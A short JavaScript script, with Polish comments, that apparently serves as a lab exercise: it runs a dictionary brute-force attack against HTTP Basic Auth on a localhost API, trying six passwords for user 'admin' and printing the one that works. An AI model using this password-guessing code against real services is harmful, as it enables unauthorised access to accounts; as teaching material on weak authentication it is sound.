// adres naszego api
const url = 'http://localhost:3000/api/data';
const username = 'admin';

// nasz slownik hasel - probujemy po kolei
const dictionary = ['apple', 'password', 'admin123', 'sky', 'cat', 'water'];

async function manualBruteForce() {
    console.log('rozpoczynam reczny atak brute force...');

    for (const password of dictionary) {
        console.log(`sprawdzam haslo: ${password}`);

        // recznie tworzymy naglowek basic auth
        // musimy polaczyc login i haslo dwukropkiem i zakodowac w base64
        const credentials = Buffer.from(`${username}:${password}`).toString('base64');

        try {
            // wysylamy zapytanie uzywajac natywnego fetch
            const response = await fetch(url, {
                method: 'GET',
                headers: {
                    'Authorization': `Basic ${credentials}`
                }
            });

            // jesli status to 200 ok, znalezlismy haslo
            if (response.ok) {
                console.log(`\nsukces! znaleziono haslo: ${password}`);
                return; // konczymy dzialanie funkcji
            }
        } catch (error) {
            console.log('wystapil blad polaczenia');
        }
    }
    console.log('nie znaleziono hasla w slowniku.');
}

manualBruteForce();